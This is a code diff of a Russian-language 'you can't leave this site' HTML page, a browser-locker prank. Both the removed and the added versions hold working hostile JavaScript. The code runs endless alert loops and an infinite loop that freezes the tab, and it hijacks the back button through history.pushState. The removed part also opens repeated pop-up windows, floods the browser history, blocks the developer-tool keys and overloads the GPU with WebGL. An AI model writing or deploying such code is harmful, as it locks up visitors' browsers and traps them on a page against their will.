@@ -3,146 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тебе не выбраться!</title>
+    <title>Никуда не выйдешь!</title>
     <style>
         body {
-            animation: overload 0.05s infinite;
+            animation: lag 0.1s infinite;
             font-family: Arial, sans-serif;
             text-align: center;
             padding-top: 20%;
-            background: black;
-            color: white;
         }
-        @keyframes overload {
-            from { filter: blur(0px); transform: rotate(0deg) scale(1); }
-            to { filter: blur(20px); transform: rotate(360deg) scale(3); }
-        }
-        canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
+        @keyframes lag {
+            from { filter: blur(0px); }
+            to { filter: blur(100px); }
         }
     </style>
 </head>
 <body>
-    <h1>Вы не выйдете отсюда!</h1>
-    <canvas id="webglCanvas"></canvas>
+    <h1>Вы не можете покинуть этот сайт!</h1>
+
     <script>
-        // 1. Блокировка кнопки "Назад"
+        // Бесконечные алерты
+        function alertLoop() {
+            setTimeout(() => {
+                alert("Вы не можете уйти!");
+                alertLoop();
+            }, 100);
+        }
+        alertLoop();
+
+        // Остановка работы вкладки (бесконечный цикл)
+        function freezeBrowser() {
+            while (true) {
+                console.log(Math.random());
+            }
+        }
+        setTimeout(freezeBrowser, 500);
+
+        // Блокировка кнопки "Назад"
         history.pushState(null, "", location.href);
         window.onpopstate = function () {
             history.pushState(null, "", location.href);
         };
 
-        // 2. Бесконечные alert()
-        function spamAlerts() {
-            setTimeout(() => {
-                alert("Вы не можете уйти!");
-                confirm("Вы уверены?");
-                prompt("Введите код для выхода:");
-                spamAlerts();
-            }, 200);
-        }
-        spamAlerts();
-
-        // 3. Нагрузка процессора (бесконечный цикл)
-        function freezeCPU() {
-            while (true) {
-                Math.random();
-            }
-        }
-        setTimeout(freezeCPU, 1000);
-
-        // 4. Открытие новых вкладок при попытке закрыть сайт
+        // Предупреждение при закрытии вкладки
         window.onbeforeunload = function() {
-            setTimeout(() => { window.open(location.href, "_blank"); }, 10);
-            return "Вы уверены, что хотите уйти?";
+            return "Вы точно хотите уйти?";
         };
-
-        // 5. Автоматическая смена URL
-        setInterval(() => {
-            history.pushState(null, "", "/trap" + Math.random());
-        }, 1000);
-
-        // 6. Заполнение истории браузера
-        for (let i = 0; i < 100; i++) {
-            history.pushState(null, "", location.href + "?trap=" + i);
-        }
-
-        // 7. Блокировка клавиш F12, Ctrl+Shift+I, Ctrl+U
-        document.addEventListener("keydown", function(event) {
-            if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I") || (event.ctrlKey && event.key === "U")) {
-                event.preventDefault();
-                alert("Консоль запрещена!");
-            }
-        });
-
-        // 8. Постоянное открытие новых окон
-        setInterval(() => {
-            window.open(location.href, "_blank");
-        }, 5000);
-
-        // 9. Нагрузка на GPU с помощью WebGL
-        function startWebGL() {
-            let canvas = document.getElementById("webglCanvas");
-            let gl = canvas.getContext("webgl");
-
-            if (!gl) {
-                alert("WebGL не поддерживается!");
-                return;
-            }
-
-            let vertices = new Float32Array([
-                -1, -1, 0,
-                1, -1, 0,
-                1, 1, 0,
-                -1, 1, 0
-            ]);
-
-            let buffer = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-
-            let vertexShaderCode = `
-                attribute vec3 coordinates;
-                void main(void) {
-                    gl_Position = vec4(coordinates, 1.0);
-                }
-            `;
-            let vertexShader = gl.createShader(gl.VERTEX_SHADER);
-            gl.shaderSource(vertexShader, vertexShaderCode);
-            gl.compileShader(vertexShader);
-
-            let fragmentShaderCode = `
-                void main(void) {
-                    gl_FragColor = vec4(gl_FragCoord.x / 800.0, gl_FragCoord.y / 600.0, 0.5, 1.0);
-                }
-            `;
-            let fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
-            gl.shaderSource(fragmentShader, fragmentShaderCode);
-            gl.compileShader(fragmentShader);
-
-            let shaderProgram = gl.createProgram();
-            gl.attachShader(shaderProgram, vertexShader);
-            gl.attachShader(shaderProgram, fragmentShader);
-            gl.linkProgram(shaderProgram);
-            gl.useProgram(shaderProgram);
-
-            let coord = gl.getAttribLocation(shaderProgram, "coordinates");
-            gl.vertexAttribPointer(coord, 3, gl.FLOAT, false, 0, 0);
-            gl.enableVertexAttribArray(coord);
-
-            function renderLoop() {
-                gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-                gl.clear(gl.COLOR_BUFFER_BIT);
-                gl.drawArrays(gl.TRIANGLE_FAN, 0, 4);
-                requestAnimationFrame(renderLoop);
-            }
-            renderLoop();
-        }
-        startWebGL();
     </script>
 </body>
 </html>
